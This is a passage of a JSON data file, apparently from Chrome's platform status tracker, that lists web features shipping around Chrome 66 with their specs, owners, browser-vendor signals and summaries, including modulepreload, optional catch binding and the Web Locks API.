    "summary": "The \"implementation-dependent String\" returned from Function.prototype.toString() is now a fully-specified String, which is a substring of the source code that defines the function. For example, this preserves whitespace and comments between the \"function\" keyword and the function name identifier.\r\n\r\nFor functions created with CreateDynamicFunction (such as through `new Function()`), the String is fully-specified and includes the parameters passed to CreateDynamicFunction.",
    "id": 5666372071718912,
    "resources": {
      "docs": [
        "https://github.com/tc39/Function-prototype-toString-revision",
        "https://tc39.github.io/Function-prototype-toString-revision/"
      ]
    }
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2018-02-16 06:48:38.325520",
      "by": "ksakamoto@chromium.org"
    },
    "name": "Link rel=modulepreload",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/links.html#link-type-modulepreload",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1425310",
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 66
        },
        "owners": [
          "ksakamoto@chromium.org",
          "domenic@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 66,
        "blink_components": [
          "Blink>Loader"
        ],
        "desktop": 66,
        "flag": false,
        "android": 66,
        "bug": "http://crbug.com/740886",
        "intervention": false
      },
      "opera": {
        "android": 53,
        "desktop": 53
      },
      "edge": {
        "view": {
          "url": "https://wpdev.uservoice.com/forums/257854-microsoft-edge-developer/suggestions/32629669-implement-link-rel-modulepreload",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=180574",
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "The new \"modulepreload\" rel value in <link> element and Link: header provides a way to initiate early (and high-priority) loading of module scripts.",
    "id": 5762805915451392,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1WebH4IOCswACUbaczx5cGQPVl5mnqcieOd4MRJM2syk/edit?usp=sharing"
      ],
      "samples": [
        "https://irori.github.io/modulepreload-demo/"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-02-05 21:32:37.732950",
      "by": "vmpstr@chromium.org"
    },
    "name": "Make <tr> with transform be a containing block.",
    "tags": [
      "transformed tr",
      "table-row"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "De-facto standard",
        "val": 1
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://www.w3.org/TR/css-transforms-1/",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 66
        },
        "owners": [
          "vmpstr@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Layout>Table"
        ],
        "desktop": 66,
        "flag": false,
        "android": 66,
        "bug": "https://crbug.com/804952",
        "intervention": false
      },
      "opera": {
        "android": 53,
        "desktop": 53
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Elements with table-row, table-row-group, table-header-group, table-footer-group, table-cell, and table-caption that have a transform property should be containing blocks for fixed position elements. Blink currently does not make <tr>, <tbody>, <tfoot>, and <thead> be a containing block for fixed position elements, which we propose to change.\r\n",
    "id": 5514792538210304,
    "resources": {
      "docs": [
        "https://www.w3.org/TR/css-transforms-1/#transformable-element",
        "https://www.w3.org/TR/css-transforms-1/#transform-rendering"
      ],
      "samples": [
        "http://output.jsbin.com/cemigih"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-03-01 16:37:30.524880",
      "by": "mlamouri@chromium.org"
    },
    "name": "Media Capabilities: decoding",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://wicg.github.io/media-capabilities/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 66
        },
        "owners": [
          "chcunningham@chromium.org",
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 66,
        "blink_components": [
          "Blink>Media>Capabilities"
        ],
        "desktop": 66,
        "flag": false,
        "android": 66,
        "bug": "https://crbug.com/690364",
        "intervention": false
      },
      "opera": {
        "android": 55,
        "desktop": 55
      },
      "edge": {
        "view": {
          "url": "https://github.com/WICG/media-capabilities/issues/43",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=181064",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "This specification intends to provide APIs to allow websites to make an optimal decision when picking media content for the user. This launch is only about exposing the decoding abilities of the device/system/browser.",
    "id": 5869632707624960,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2017/12/chrome-63-64-media-updates#media-capabilities-decoding-info-api"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/media-capabilities/decoding-info.html",
        "https://beaufortfrancois.github.io/sandbox/media-capabilities/decoding-info-2.html"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2018-01-31 18:48:37.687620",
      "by": "mek@chromium.org"
    },
    "name": "Network error when blob URL loading fails",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://fetch.spec.whatwg.org/#scheme-fetch",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 66
        },
        "owners": [
          "mek@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 66,
        "blink_components": [
          "Blink>FileAPI"
        ],
        "desktop": 66,
        "flag": false,
        "android": 66,
        "bug": "https://crbug.com/732750",
        "intervention": false
      },
      "opera": {
        "android": 53,
        "desktop": 53
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Rather than returning a 404 when attempting to read from a invalid/non-existing Blob URL, these fetches should result in a network error.\r\n",
    "id": 5689937680662528,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-01-25 18:40:12.669950",
      "by": "mathias@chromium.org"
    },
    "name": "Optional catch binding",
    "tags": [
      "javascript",
      "optional catch binding"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://tc39.github.io/proposal-optional-catch-binding/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1380881",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 66
        },
        "owners": [
          "gsathya@chromium.org",
          "adamk@chromium.org",
          "bakkot@gmail.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 66,
        "blink_components": [
          "Blink>JavaScript>Language"
        ],
        "desktop": 66,
        "flag": false,
        "android": 66,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=6889",
        "intervention": false
      },
      "opera": {
        "android": 53,
        "desktop": 53
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/blog/7862/release-notes-for-safari-technology-preview-37/",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This proposal allows the `catch` clause to exist without a parameter.",
    "id": 5810795665424384,
    "resources": {
      "samples": [
        "http://2ality.com/2017/08/optional-catch-binding.html",
        "https://twitter.com/mathias/status/956209997808939008"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-01-30 08:57:02.666320",
      "by": "tkent@chromium.org"
    },
    "name": "Send “input” Event on activation behavior for radio and file input type",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/input.html#radio-button-state-(type=radio)",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 66
        },
        "owners": [
          "shanmuga.m@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 66,
        "blink_components": [
          "Blink>Forms"
        ],
        "desktop": 66,
        "flag": false,
        "android": 66,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=534245",
        "intervention": false
      },
      "opera": {
        "android": 53,
        "desktop": 53
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "As per spec, on input activation behavior fires a input event, then a change event for radio and file <input > type.",
    "id": 5669661005840384,
    "resources": {
      "docs": [
        "https://html.spec.whatwg.org/multipage/input.html#radio-button-state-(type=radio)",
        "https://html.spec.whatwg.org/multipage/input.html#file-upload-state-(type=file)"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-01-30 08:58:15.549530",
      "by": "tkent@chromium.org"
    },
    "name": "Send “input” Event on checkbox click",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/#checkbox-state-(type=checkbox)",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 66
        },
        "owners": [
          "shanmuga.m@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 66,
        "blink_components": [
          "Blink>Forms"
        ],
        "desktop": 66,
        "flag": false,
        "android": 66,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=534245",
        "intervention": false
      },
      "opera": {
        "android": 53,
        "desktop": 53
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "As per spec, click on mutable checkbox fires a click event, then an input event, then a change event.",
    "id": 5768525515849728,
    "resources": {}
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-03-28 21:19:41.370290",
      "by": "ericbidelman@google.com"
    },
    "name": "Service Worker: Disallow CORS responses for same-origin requests.",
    "tags": [
      "fetch",
      "cors",
      "same-origin",
      "request",
      "response",
      "mode",
      "serviceworker",
      "service",
      "worker"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://fetch.spec.whatwg.org/",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/whatwg/fetch/issues/629#issuecomment-356297558",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 66
        },
        "owners": [
          "falken@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 66,
        "blink_components": [
          "Blink>ServiceWorker"
        ],
        "desktop": 66,
        "flag": false,
        "android": 66,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=800234",
        "intervention": false
      },
      "opera": {
        "android": 53,
        "desktop": 53
      },
      "edge": {
        "view": {
          "url": "https://github.com/whatwg/fetch/issues/629#issuecomment-355618122",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://github.com/whatwg/fetch/issues/629#issuecomment-355737294",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "With this change, a service worker can no longer respond to a request whose mode is 'same-origin' with a response whose type is 'cors'. This is a security measure added to the Fetch specification via  https://github.com/whatwg/fetch/issues/629 and https://github.com/whatwg/fetch/pull/655.",
    "id": 5694278818856960,
    "resources": {
      "docs": [
        "https://github.com/whatwg/fetch/issues/629",
        "https://github.com/whatwg/fetch/pull/655"
      ]
    }
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-03-28 21:20:05.759470",
      "by": "ericbidelman@google.com"
    },
    "name": "Service Worker: Non-nullable FetchEvent#clientId",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/ServiceWorker/#fetchevent",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/w3c/ServiceWorker/issues/1266#issuecomment-361965700",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 66
        },
        "owners": [
          "bashi@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 66,
        "blink_components": [
          "Blink>ServiceWorker"
        ],
        "desktop": 66,
        "flag": false,
        "android": 66,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=807818",
        "intervention": false
      },
      "opera": {
        "android": 53,
        "desktop": 53
      },
      "edge": {
        "view": {
          "url": "https://github.com/w3c/ServiceWorker/issues/1266#issuecomment-361965700",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://github.com/w3c/ServiceWorker/issues/1266#issuecomment-361965700",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "With this change FetchEvent#clientId will return an empty string instead of null when it isn't set, e.g., for a navigation request.",
    "id": 5942197618737152,
    "resources": {}
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-03-28 21:31:33.086350",
      "by": "ericbidelman@google.com"
    },
    "name": "Service Worker: Requests from embed and object elements skip service workers",
    "tags": [
      "serviceworker",
      "service",
      "worker",
      "fetch",
      "event",
      "fetchevent",
      "plugin",
      "embed",
      "object",
      "plug-in"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/ServiceWorker/#implementer-concerns",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 66
        },
        "owners": [
          "falken@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 66,
        "blink_components": [
          "Blink>ServiceWorker"
        ],
        "desktop": 66,
        "flag": false,
        "android": 66,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=771933",
        "intervention": false
      },
      "opera": {
        "android": 53,
        "desktop": 53
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Service workers no longer receive fetch events for requests from embed and object elements. This includes both requests for the main resource itself (the src or data attribute) and for any requests from the resulting context (the plugin or HTML context). This change was made to adhere to the specification, which disallows service worker interception due to security considerations.\r\n",
    "id": 6313531834105856,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-02-15 13:33:09.519940",
      "by": "mathiasb@google.com"
    },
    "name": "String.prototype.trimStart / String.prototype.trimEnd",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://github.com/tc39/proposal-string-left-right-trim",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1434007",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 66
        },
        "owners": [
          "mathias@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 66,
        "blink_components": [
          "Blink>JavaScript>Language"
        ],
        "desktop": 66,
        "flag": false,
        "android": 66,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=6530",
        "intervention": false
      },
      "opera": {
        "android": 53,
        "desktop": 53
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/blog/8088/release-notes-for-safari-technology-preview-49/",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Until now, String.prototype.{trimLeft,trimRight} were non-standard language extensions, required for Web compatibility.\r\n\r\nThe Stage 3 proposal at https://github.com/tc39/proposal-string-left-right-trim standardizes this functionality as String.prototype.{trimStart,trimEnd}, and defines String.prototype.{trimLeft,trimRight} as aliases for backwards compatibility.\r\n\r\nThis patch implements that proposal behind the --harmony-string-trimming flag.",
    "id": 4790066333351936,
    "resources": {}
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2018-02-28 15:09:49.964000",
      "by": "xlai@chromium.org"
    },
    "name": "The ImageBitmap rendering context for <canvas>",
    "tags": [
      "ImageBitmap canvas OffscreenCanvas transfer"
    ],
    "comments": "Feature was accidentally shipped with the wrong method name in Firefox (transferImageBitmap instead of transferFromImageBitmap) ",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://html.spec.whatwg.org/multipage/scripting.html#the-imagebitmap-rendering-context",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 66
        },
        "owners": [
          "junov@chromium.org",
          "xidachen@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 66,
        "blink_components": [
          "Blink>Canvas"
        ],
        "desktop": 66,
        "flag": false,
        "android": 66,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=658734",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "A new rendering context that streamlines the display of ImageBitmap objects. This new rendering context uses transfer semantics to take ownership of the pixels of an ImageBitmap object, thus avoiding memory duplication and rasterization overhead.",
    "id": 5709799995998208,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/ImageBitmapRenderingContext"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-02-05 17:26:39.716480",
      "by": "jmedley@google.com"
    },
    "name": "Unprefix CSS Grid Layout gutter properties",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://www.w3.org/TR/css-grid-1/#gutters",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1398482",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 66
        },
        "owners": [
          "rego@igalia.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 66,
        "blink_components": [
          "Blink>Layout>Grid"
        ],
        "desktop": 66,
        "flag": false,
        "android": 66,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=761904",
        "intervention": false
      },
      "opera": {
        "android": 53,
        "desktop": 53
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=180290",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Rename gutter properties to remove \"grid-\" prefix:\r\n* grid-gap => gap\r\n* grid-row-gap => row-gap\r\n* grid-column-gap => column-gap\r\n\r\nNote that column-gap already exists and is used by css-multicol.\r\n\r\nThe parsing needs to be updated as now the default value is \"normal\".\r\n\r\nThe old (prefixed) properties names will be kept working as aliases.",
    "id": 4986266210795520,
    "resources": {}
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-06-20 22:54:23.520876",
      "by": "jsbell@chromium.org"
    },
    "name": "Web Locks API",
    "tags": [
      "locks",
      "lock",
      "locking"
    ],
    "comments": "await navigator.locks.request('my_resource', async lock => {\r\n\r\n  // The code in here runs once the lock for 'my_resource'\r\n  // is acquired. The lock is released once this callback\r\n  // completes.\r\n\r\n  const url = await look_up_in_database();\r\n  const response = await fetch(url);\r\n  const body = await response.text();\r\n  await store_body_in_database(body);\r\n});\r\n\r\n// The 'await' above completes once the lock has been released,\r\n// so code can continue running here.\r\n",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://inexorabletash.github.io/web-locks/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Origin trial",
          "val": 8,
          "milestone_str": 66
        },
        "owners": [
          "jsbell@chromium.org"
        ],
        "prefixed": false,
        "origintrial": true,
        "webview": 66,
        "blink_components": [
          "Blink>Storage"
        ],
        "desktop": 66,
        "flag": false,
        "android": 66,
        "bug": "https://crbug.com/161072",
        "intervention": false
      },
      "opera": {
        "android": 53,
        "desktop": 53
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "A new web platform API that allows script running in one tab to asynchronously acquire a lock, hold it while work is performed, then release it. While held, no other script in the origin can aquire the same lock.\r\n\r\nThis allows applications that often span multiple tabs to coordinate resource usage.",
    "id": 5712361335816192,
    "resources": {
      "docs": [
        "https://github.com/inexorabletash/web-locks"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-03-23 23:18:12.303950",
      "by": "rtoy@chromium.org"
    },
    "name": "WebAudio: AudioParam setter is equivalent to setValueAtTime",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 66
        },
        "owners": [
          "rtoy@chromium.org",
          "hoch@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "ios": 66,
        "blink_components": [
          "Blink>WebAudio"
        ],
        "desktop": 66,
        "flag": false,
        "android": 66,
        "bug": "http://crbug.com/764396",
        "intervention": false
      },
      "opera": {
        "android": 53,
        "desktop": 53
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "When setting the value of an AudioParam via the value setter, the value is updated exactly as if setValueAtTime(newValue, context.currentTime).\r\n\r\nThis includes throwing errors that weren't previously thrown and changing the AudioParam timeline",
    "id": 6254081119092736,
    "resources": {
      "docs": [
        "https://webaudio.github.io/web-audio-api/#attributes-5"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-01-30 17:44:40.857940",
      "by": "rtoy@chromium.org"
    },
    "name": "WebAudio: Remove dezippering",
    "comments": "This has the potential to break existing apps if they depended on smooth transitions using the value setter.\r\n\r\nIf dezippering is still needed, the appropriate replacement is to use setTargetAtTime(value, context.currentTime, timeConstant), where timeConstant is probably around 10-20 ms, which was the typical value used in Chrome for dezippering.\r\n\r\nIf dezippering is not needed, nothing needs to be done,\r\n\r\nDeprecation messages will be displayed, stating dezippering will be removed in M66.\r\n",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 66
        },
        "owners": [
          "rtoy@chromium.org",
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>WebAudio"
        ],
        "desktop": 66,
        "flag": false,
        "android": 66,
        "bug": "http://crbug.com/496282",
        "intervention": false
      },
      "opera": {
        "android": 53,
        "desktop": 53
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Historically, Chrome implemented dezippering such that when the value setter of an AudioParam was used, the value was not changed instantaneously.  Instead, an exponential approach equivalent to setTargetValueAtTime was done.  The actual time constant used was never specified and depended on the AudioParam.\r\n\r\nWith the spec change in https://github.com/WebAudio/web-audio-api/pull/393, (Sep 2015), all dezippering was removed from the spec.\r\n\r\nDezippering will be removed from Chrome.",
    "id": 5287995770929152,
    "resources": {
      "docs": [
        "https://webaudio.github.io/web-audio-api/#audioparam-transitions",
        "https://github.com/WebAudio/web-audio-api/issues/76#issuecomment-107679878",
        "https://github.com/WebAudio/web-audio-api/pull/393"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2018-02-28 18:51:34.122430",
      "by": "bnc@google.com"
    },
    "name": "WebSockets over HTTP/2",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://tools.ietf.org/html/draft-ietf-httpbis-h2-websockets-00",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 66
        },
        "owners": [
          "bnc@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 66,
        "blink_components": [
          "Internals>Network>HTTP2"
        ],
        "desktop": 66,
        "flag": true,
        "android": 66,
        "bug": "https://crbug.com/801564",
        "intervention": false
      },
      "opera": {
        "android": 53,
        "desktop": 53
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Implement support for WebSockets over HTTP/2 in Chromium according to specification, see most recent draft at https://tools.ietf.org/html/draft-ietf-httpbis-h2-websockets-00.  This would only be used for secure WebSockets requests, and only if there is already an HTTP/2 connection where the server has already advertised support for WebSockets over HTTP/2 via the HTTP/2 SETTINGS parameter defined in the specification.",
    "id": 6251293127475200,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1ZxaHz4j2BDMa1aI5CQHMjtFI3UxGT459pjYv4To9rFY"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-03-06 22:26:22.145800",
      "by": "hongchan@google.com"
    },
    "name": "[WebAudio] AudioWorklet",
    "tags": [
      "WebAudioAPI",
      "Worklet",
      "ScriptProcessorNode"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
